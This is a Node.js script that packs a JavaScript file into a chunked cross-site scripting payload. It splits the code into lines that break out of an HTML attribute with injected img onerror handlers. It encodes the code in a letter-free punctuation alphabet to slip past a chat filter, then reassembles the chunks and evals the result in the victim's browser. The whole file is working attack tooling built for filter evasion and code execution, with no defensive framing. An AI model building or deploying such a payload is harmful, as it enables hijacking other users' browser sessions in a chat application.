#!/usr/bin/env node
// compress.js — pack ../core.js for the chunked img/onerror transport.
// terser -> deflateRaw (no header/CRC) -> constrained base-25: the buffer
// as one big integer (0x01 sentinel keeps leading zero bytes) over 25
// chars: 23 punct (#%!()+,-.:;=>?@[]^_{|}~ — ! . ? are back; / is gone)
// + 2 digits (0 and 1) — zero letters at all. Divisor 25 after punct, 23
// after a digit (no digit follows a digit). Excluded: " $ & ' * / 2-9 <
// \ ` + all letters — chunks sit raw inside `..` in a double-quoted attr.
// +73% size vs base64's +33%.
// Decoder = minimal inflate (stored + fixed + dynamic blocks; overrun of
// the input throws 'decode' instead of hanging) + b25 + utf8 str, shipped
// as DATA armored with
// encodeURIComponent(...).replace(/'/g,'%27'): censor hits land inside a
// quoted string, never in live code. window.run = decode+eval.
// Every line is k/N. Decoder armor chunks fill window.p slots, payload
// chunks fill window.d slots (p=window.p||[],p[i]=`..`) so onerror races
// cannot corrupt order. The last line polls until both arrays are full,
// evals the armor and run()s the payload. Type in any order.
// run() checks the joined base-25 payload for a raw star first (the char
// is not in the alphabet, so one means censor tamper): on hit it shows
// star@offset with 5 chars of context each side and never executes.
// If nothing happens, probe.txt's line prints each stage's joined length
// (want the two logged numbers) + star offsets.
// usage: npm install terser && node compress.js
const fs = require("fs"), zlib = require("zlib");
const MAX = 254;
const PUNCT = "#%!()+,-.:;=>?@[]^_{|}~";  // 23 punctuation chars (! . ? back; / out)
const DIG = "01";                        // 2 digits — never two adjacent in output; no letters at all

const DECODER_SRC = `
function b25(s){var P="#%!()+,-.:;=>?@[]^_{|}~",D="01",n=0n,p=1n,q=0,i,c,d,m,x;for(i=s.length-1;i>=0;i--){c=s[i];if(q){d=P.indexOf(c);m=23n;q=0}else{m=25n;x=D.indexOf(c);if(x<0)d=P.indexOf(c);else{d=23+x;q=1}}n+=BigInt(d)*p;p*=m}var o=[];while(n>1n){o.push(Number(n%256n));n/=256n}return o.reverse()}
function str(a){
var CHUNK=8192,parts=[],buf=[],i,c,n=a.length;
for(i=0;i<n;i++){
c=a[i];
if(c>223)c=(c&15)<<12|(a[++i]&63)<<6|a[++i]&63;
else if(c>191)c=(c&31)<<6|a[++i]&63;
buf.push(c);
if(buf.length===CHUNK){parts.push(String.fromCharCode.apply(null,buf));buf.length=0}
}
if(buf.length)parts.push(String.fromCharCode.apply(null,buf));
return parts.join('');
}
function inflate(src){
var p=0,out=[];
function bit(){if(p>>3>=src.length)throw'decode';var b=src[p>>3]>>(p&7)&1;p++;return b}
function take(n){var v=0,s=0;while(n--){v|=bit()<<s;s++}return v}
function huff(lens){
var max=0,i,c=0,count=[],next=[],map={};
for(i=0;i<lens.length;i++)if(lens[i]>max)max=lens[i];
for(i=0;i<=max;i++)count[i]=0;
for(i=0;i<lens.length;i++)count[lens[i]]++;
count[0]=0;
for(i=1;i<=max;i++){c=c+count[i-1]<<1;next[i]=c}
for(i=0;i<lens.length;i++)if(lens[i]){map[lens[i]*65536+next[lens[i]]]=i;next[lens[i]]++}
return function(){var code=0,len=0;do{code=code<<1|bit();len++}while(map[len*65536+code]===undefined&&len<=max);return map[len*65536+code]};
}
var LB=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258];
var LX=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0];
var DB=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577];
var DX=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13];
var ORD=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],fix=null;
for(;;){
var last=take(1),type=take(2),lit,dis,i;
if(type==0){
p=p+7&-8;var n=src[p>>3]|src[p+8>>3]<<8;p+=32;
while(n--){out.push(src[p>>3]);p+=8}
}else{
if(type==1){
if(!fix){var a=[],b=[];for(i=0;i<288;i++)a[i]=i<144?8:i<256?9:i<280?7:8;for(i=0;i<32;i++)b[i]=5;fix=[huff(a),huff(b)]}
lit=fix[0];dis=fix[1];
}else{
var hlit=take(5)+257,hdist=take(5)+1,hclen=take(4)+4,cl=[];
for(i=0;i<19;i++)cl[i]=0;
for(i=0;i<hclen;i++)cl[ORD[i]]=take(3);
var ch=huff(cl),lens=[],total=hlit+hdist;
while(lens.length<total){
var s=ch();
if(s<16)lens.push(s);
else if(s==16){var r=3+take(2),prev=lens[lens.length-1];while(r--)lens.push(prev)}
else{var r=s==17?3+take(3):11+take(7);while(r--)lens.push(0)}
}
lit=huff(lens.slice(0,hlit));dis=huff(lens.slice(hlit));
}
for(;;){
var s=lit();
if(s<256){out.push(s);continue}
if(s==256)break;
s-=257;
var len=LB[s]+take(LX[s]),ds=dis(),dd=DB[ds]+take(DX[ds]),from=out.length-dd;
while(len--)out.push(out[from++]);
}
}
if(last)break;
}
return out;
}
window.run=function(s){var i=s.indexOf("*");if(i>-1)document.body.innerHTML="<pre>star@"+i+":"+s.slice(Math.max(0,i-5),i+6);else eval(str(inflate(b25(s))))};
`;

(async () => {
  const { code } = await require("terser").minify(fs.readFileSync("../core.js", "utf8"),
    { compress: true, mangle: true, module: true });
  const raw = zlib.deflateRawSync(code, { level: 9 });
  // constrained base-25 encode: the buffer as one big integer, 0x01 sentinel
  // first so leading zero bytes survive. Digits come out LSB-first; after a
  // digit the next digit is mod 23 (punct only), else mod 25 — so no two
  // digits ever end up adjacent. Reversed at end. Zero letters in charset.
  let num = 1n;
  for (const b of raw) num = num * 256n + BigInt(b);
  const parts = [];
  let prevD = false; // was the previous emitted char a digit?
  while (num > 0n) {
    const m = prevD ? 23n : 25n, digit = Number(num % m);
    num /= m;
    if (prevD) { parts.push(PUNCT[digit]); prevD = false; }
    else if (digit < 23) parts.push(PUNCT[digit]);
    else { parts.push(DIG[digit - 23]); prevD = true; }
  }
  const data = parts.reverse().join("");
  const armor = encodeURIComponent(DECODER_SRC.replace(/\n/g, "")).replace(/'/g, "%27").replace(/\*/g, "%2A").replace(/%2C/g, ",");;

  // chunk both stages into indexed slot lines over one total N
  let decChunks, dataChunks, N, w = 0;
  for (;;) {
    w++;
    const d9 = "9".repeat(w);
    const oh = `${d9}/${d9}"></div><img src=x onerror="p=window.p||[],p[${d9}]=` + "`x`\"><div class=\"";
    const size = MAX - oh.length - 1;
    const chop = s => { const a = []; for (let i = 0; i < s.length; i += size) a.push(s.slice(i, i + size)); return a; };
    decChunks = chop(armor); dataChunks = chop(data);
    N = decChunks.length + dataChunks.length + 1; // + finale
    if (String(N).length <= w && String(Math.max(decChunks.length, dataChunks.length) - 1).length <= w) break;
  }
  const A = decChunks.length, B = dataChunks.length;
  const slot = (slotName, c, k, i) =>
    `${k}/${N}"></div><img src=x onerror="${slotName}=window.${slotName}||[],${slotName}[${i}]=\`${c}\`"><div class="`;

  const lines = [
    ...decChunks.map((c, j) => slot("p", c, j + 1, j)),
    ...dataChunks.map((c, j) => slot("d", c, A + j + 1, j)),
    // finale: poll until both stages are complete, eval armor, run payload.
    // run() itself gates on the star check, so a tampered payload never
    // executes. p/d are the implicit globals the chunk handlers create.
    // The f0 guard makes the finale idempotent: the chat list can be
    // rebuilt (target switch, re-enter screen), re-firing every message's
    // onerror; without it each re-fire stacks another interval - and since
    // t is reassigned, the older ones are never cleared and would eval the
    // payload every 30ms forever.
    `${A + B + 1}/${N}"></div><img src=x onerror="if(window.t)return;t=setInterval(()=>{` +
      `if((a=p.join('')).length>=${armor.length})` +
      `if((b=d.join('')).length>=${data.length}){` +
      `clearInterval(t);` +
      `try{eval(decodeURIComponent(a));run(b);}` +
      `catch(e){document.body.innerHTML=e.stack}` +
      `}},30)"><div class="`,
  ];
  const longest = Math.max(...lines.map(l => l.length + 1)); // +1 = newline
  if (longest > MAX) throw new Error(`payload line is ${longest}B > ${MAX}B`);
  fs.writeFileSync("payload.txt", lines.map(l => l + "\n").join(""), "ascii");
  
  console.log(`minify ${code.length} -> b25 ${data.length} | armor ${armor.length}`);
  console.log(`payload.txt: ${lines.length} lines (${A} decoder + ${B} payload + finale), longest ${longest}`);
})();